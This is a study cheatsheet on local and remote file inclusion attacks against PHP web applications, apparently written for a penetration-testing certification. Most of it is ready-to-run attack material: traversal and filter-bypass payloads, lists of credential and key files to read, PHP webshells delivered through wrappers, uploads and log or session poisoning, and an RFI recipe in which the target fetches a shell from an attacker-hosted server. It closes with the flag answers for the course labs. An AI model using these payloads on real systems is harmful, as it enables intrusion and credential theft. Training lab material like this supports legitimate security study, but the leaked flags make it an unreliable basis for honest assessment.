# File Inclusion — Exam Cheatsheet

---

## Detection

```bash
# Test for LFI on any parameter that looks like a page/file selector
?param=/etc/passwd                    # absolute path
?param=../../../../etc/passwd         # path traversal (4-8 levels)
?param=C:\Windows\boot.ini            # Windows
```
> Swap `param` for the actual parameter name (e.g., `page`, `file`, `lang`). If the file contents appear in the response, Local File Inclusion (LFI) is confirmed. Increase the number of `../` sequences if deeper traversal is needed.

If file contents appear in response → LFI confirmed.

---

## Sink Types (Read vs Execute)

| Function | Read | Execute | Remote URL |
|----------|:----:|:-------:|:----------:|
| **PHP** | | | |
| `include()`, `require()` | ✅ | ✅ | ✅* |
| `file_get_contents()` | ✅ | ❌ | ✅ |
| `fopen()`, `file()` | ✅ | ❌ | ❌ |
| **Node.js** | | | |
| `fs.readFile()` | ✅ | ❌ | ❌ |
| `res.render()` | ✅ | ✅ | ❌ |
| **Java** | | | |
| `<jsp:include>` | ✅ | ❌ | ❌ |
| `<c:import>` | ✅ | ✅ | ✅ |
| **.NET** | | | |
| `Response.WriteFile()` | ✅ | ❌ | ❌ |
| `<!--#include file="..."-->` | ✅ | ✅ | ✅ |

*Remote URL requires `allow_url_include=On` (off by default since PHP 5.2)

---

## Bypasses by Filter Type

| Filter | Bypass |
|--------|--------|
| Plain absolute path blocked | Path traversal: `../../../../etc/passwd` |
| Directory prefix (`./pages/INPUT`) | Same traversal — `../../../../etc/passwd` (goes up out of prefix dir) |
| Filename prefix (`lang_INPUT`) | Leading `/`: `/../../../etc/passwd` |
| Appended extension (`INPUT.php`) | `php://filter/read=convert.base64-encode/resource=FILE` |
| Non-recursive `../` strip | `....//` (becomes `../` after one strip) |
| `.`/`/` denylist | URL-encode: `%2e%2e%2f` → `../` |
| Behind a decode step | Double-encode: `%252e%252e%252f` |
| Approved-path regex (`^./pages/`) | Start with approved prefix, then traverse out |

---

## Critical Files (Linux)

| Path | Use |
|------|-----|
| `/etc/passwd` | User enum (UID ≥ 1000 = human) |
| `/etc/shadow` | Hashes (root-only usually) |
| `/etc/hosts` | Internal hostnames |
| `/proc/self/environ` | Env vars + log poisoning sink |
| `/proc/self/cmdline` | Current process args |
| `/var/www/html/config.php` | App DB creds |
| `/var/www/html/index.php` | App source (via PHP filter) |
| `/etc/apache2/apache2.conf` | Webroot path + log paths |
| `/etc/apache2/envvars` | `APACHE_LOG_DIR` value |
| `/etc/nginx/sites-enabled/default` | nginx vhost config |
| `/var/log/apache2/access.log` | Log poisoning target |
| `/var/log/nginx/access.log` | nginx log (usually www-data readable) |
| `/var/lib/php/sessions/sess_<PHPSESSID>` | Session poisoning target |
| `~/.ssh/id_rsa` | Private keys (try `/home/<user>/.ssh/id_rsa`) |
| `~/.bash_history` | Recent commands |
| `/etc/php/X.Y/apache2/php.ini` | Check `allow_url_include` etc. |

## Critical Files (Windows)

| Path | Use |
|------|-----|
| `C:\Windows\boot.ini` | Win 2003 — LFI confirmation |
| `C:\Windows\win.ini` | Win 7+ — LFI confirmation |
| `C:\Windows\Temp\sess_<PHPSESSID>` | Session poisoning |
| `C:\xampp\apache\logs\access.log` | XAMPP Apache log |
| `C:\inetpub\logs\LogFiles\W3SVC1\` | IIS logs |
| `C:\xampp\php\php.ini` | XAMPP PHP config |

---

## PHP Wrappers (LFI → RCE)

### `php://filter` — Source Disclosure (always works)
```
?param=php://filter/read=convert.base64-encode/resource=FILE
```
> Returns the PHP source code as base64 instead of executing it. Works even when an extension is appended. Decode with `echo 'OUTPUT' | base64 -d`.

### `data://` — Inline PHP (needs allow_url_include)
```bash
# Build payload:
echo '<?php system($_GET["cmd"]); ?>' | base64
# → PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+

# Trigger:
curl "http://TARGET/?p=data://text/plain;base64,PD9waHA...&cmd=id"
```
> Encodes a PHP webshell as base64 and delivers it inline via the `data://` wrapper. Requires `allow_url_include=On`. Replace the base64 string with your own encoded payload and set `cmd` to the command you want to run.

### `php://input` — POST Body as Code (needs allow_url_include)
```bash
curl -X POST --data '<?php system($_GET["cmd"]); ?>' \
  "http://TARGET/?p=php://input&cmd=id"
```
> Sends PHP code in the POST body and includes it via `php://input`. Requires `allow_url_include=On`. The `cmd` parameter controls which OS command runs.

### `expect://` — Direct Command Exec (needs expect extension)
```bash
curl "http://TARGET/?p=expect://id"
```
> Runs a shell command directly through the `expect://` wrapper. Rarely enabled in production, but worth trying. Replace `id` with any command.

### `zip://` and `phar://` — Archive Tricks (LFI + file upload)
```bash
# zip:// 
zip shell.jpg shell.php
# include: zip://uploads/shell.jpg%23shell

# phar://
php --define phar.readonly=0 build_phar.php
# include: phar://uploads/shell.phar/shell.txt
```
> Package a PHP shell inside a ZIP or PHAR archive, upload it as an image, then include the inner file with `zip://` or `phar://`. The `%23` is a URL-encoded `#` separator for `zip://`.

---

## RFI (Remote File Inclusion)

Requires `allow_url_include=On`. Off by default since PHP 5.2.

```bash
# Host shell:
mkdir /tmp/rfi && echo '<?php system($_GET["cmd"]); ?>' > /tmp/rfi/shell.php
cd /tmp/rfi && python3 -m http.server 8888 &

# Trigger:
curl "http://TARGET/?p=http://ATTACKER:8888/shell.php&cmd=id"

# Or via SMB (Windows targets — bypasses allow_url_include):
impacket-smbserver -smb2support share /tmp/rfi
# include: \\ATTACKER\share\shell.php
```
> Creates a PHP webshell on your machine, serves it over HTTP, then triggers Remote File Inclusion (RFI) so the target downloads and executes it. The SMB method works on Windows when HTTP RFI is blocked. Replace `ATTACKER` with your tun0 IP.

---

## LFI + Upload = RCE (no execute sink needed)

```bash
# 1. Embed PHP in image (GIF magic byte = printable ASCII):
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif

# 2. Upload:
curl -X POST "http://TARGET/upload" -F "file=@shell.gif"

# 3. Find upload path (inspect avatar img src, or fuzz /uploads/, /profile_images/, /avatars/)

# 4. Trigger via LFI:
curl "http://TARGET/?p=./uploads/shell.gif&cmd=id"
```
> Hides a PHP shell inside a GIF by prepending the GIF magic bytes. Upload it as a profile image, then include it via LFI to execute it. Adjust the upload endpoint and path to match the target.

---

## Log Poisoning

Best when `allow_url_include=Off` and uploads are restricted.

### Session Poisoning (most reliable)
```bash
SID=$(curl -sk "http://TARGET/" -i | grep -oP 'PHPSESSID=\K[a-z0-9]+')

# Step 1: Poison
curl -b "PHPSESSID=$SID" \
  "http://TARGET/?p=%3C%3Fphp%20system%28%24_GET%5B'cmd'%5D%29%3B%3F%3E"

# Step 2: Include + execute
curl -b "PHPSESSID=$SID" \
  "http://TARGET/?p=/var/lib/php/sessions/sess_$SID&cmd=id"
```
> Grabs the session ID from the response cookie, writes a PHP shell into the session parameter, then includes the session file via LFI to execute it. Re-poison before every command — each include overwrites the session value.

> **Re-poison before every command** — including the session file overwrites the value.

### Apache/nginx Log Poisoning
```bash
# Poison via User-Agent (single quotes to avoid escape issues):
curl -H "User-Agent: <?php system(\$_GET['c']); ?>" "http://TARGET/"

# Include log:
curl "http://TARGET/?p=/var/log/apache2/access.log&c=id"
# or for nginx:
curl "http://TARGET/?p=/var/log/nginx/access.log&c=id"
```
> Writes a PHP shell into the web server access log via the `User-Agent` header, then includes the log file through LFI. Use `\$` to prevent local shell variable expansion. Apache logs are often root-only; nginx logs are usually readable by `www-data`.

> Apache access.log usually root-only on modern Debian. nginx logs usually `www-data` readable. Try both.

---

## Automation (ffuf)

```bash
# Step 1 — Find hidden parameters
ffuf -w ~/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
     -u "http://TARGET/index.php?FUZZ=test" -fs BASELINE_SIZE -t 50

# Step 2 — Fuzz LFI payloads
ffuf -w ~/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ \
     -u "http://TARGET/index.php?PARAM=FUZZ" -fs BASELINE_SIZE

# Step 3 — Find webroot
ffuf -w ~/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ \
     -u "http://TARGET/index.php?p=../../../../FUZZ/index.php" -fs BASELINE_SIZE

# Step 4 — Enumerate /etc files
ffuf -w ~/SecLists/Fuzzing/LFI/LFI-etc-files-of-all-linux-packages.txt:FUZZ \
     -u "http://TARGET/index.php?p=../../../../FUZZ" -fs BASELINE_SIZE
```
> Step 1 discovers hidden GET parameters by fuzzing parameter names. Step 2 tries known LFI payloads against the vulnerable parameter. Step 3 finds the webroot path. Step 4 enumerates sensitive `/etc` files. Run Step 1 first to set `BASELINE_SIZE` from a normal response, then filter by that size with `-fs`.

---

## Prevention (CPTS exam fodder)

| Defense | Stops |
|---------|-------|
| Whitelist mapping in code | All LFI vectors |
| `basename()` on user input | Path traversal in filename context |
| `allow_url_include = Off` | RFI, `data://`, `php://input` |
| `allow_url_fopen = Off` | Remote file ops generally |
| `open_basedir = /var/www/html/` | Traversal outside webroot |
| `disable_functions = system,exec,...` | OS exec from PHP |
| Drop PHP exec in upload dirs | Upload-then-include chain |
| ModSecurity OWASP CRS | Generic LFI/RFI payload signatures |

Error message pattern when `system()` is in disable_functions:
```
PHP Warning: system() has been disabled for security reasons
```

---

## Lab Flag Reference

| Section | Technique | Flag |
|---------|-----------|------|
| 2 — Basic LFI | `../../../../etc/passwd` traversal | `HTB{n3v3r_tru$t_u$3r_!nput}` |
| 3 — Basic Bypasses | `languages/....//....//flag.txt` (approved path + recursive bypass) | `HTB{64$!c_f!lt3r$_w0nt_$t0p_lf!}` |
| 4 — PHP Filters | `php://filter/read=convert.base64-encode/resource=configure` | DB pass: `HTB{n3v3r_$t0r3_pl4!nt3xt_cr3d$}` |
| 5 — PHP Wrappers | `php://input` POST body | `HTB{d!$46l3_r3m0t3_url_!nclud3}` |
| 6 — RFI | HTTP server hosting shell.php | `99a8fc05f033f2fc0cf9a6f9826f83f4` |
| 7 — LFI + Upload | GIF8 magic byte + embedded PHP | `HTB{upl04d+lf!+3x3cut3=rc3}` |
| 8 — Log Poisoning | PHP session poisoning | `HTB{1095_5#0u1d_n3v3r_63_3xp053d}` |
| 9 — Automated Scanning | Hidden `view` param + LFI-Jhaddix wordlist | `HTB{4u70m47!0n_f!nd5_#!dd3n_93m5}` |
| 10 — Prevention | `disable_functions = system` + error log | Answer: `security` |
| 11 — Skills Assessment | Upload + double-encoded LFI in `region` | `eedbb78d4800aa45573840ed6bd2d1e3` |

---

## Decision Tree When Stuck

```
LFI works but returns no output?
  → File might not exist — confirm with /etc/passwd first
  → Extension may be appended — use php://filter

include() executes but no RCE?
  → Sink is read-only (file_get_contents) → grab source code, find other sinks
  → Check allow_url_include for wrapper attacks

allow_url_include=Off + no upload?
  → Session poisoning (PHPSESSID file)
  → Apache log poisoning (needs www-data read on access.log)
  → /proc/self/environ poisoning

Path traversal blocked?
  → Try ....// (defeats non-recursive ../) 
  → URL-encode: %2e%2e%2f
  → Double-encode: %252e%252e%252f
  → Longer traversal (15+ ../ levels)

File extension appended?
  → php://filter/read=convert.base64-encode/resource=FILE  (no .php breakage)
  → Use uploads named with .php extension already (so .php+.php → still parses)

Filter rejects . or /?
  → Encoded (%2e %2f) survives if filter checks raw
  → Double-encoded survives if there's a layer that decodes once
```
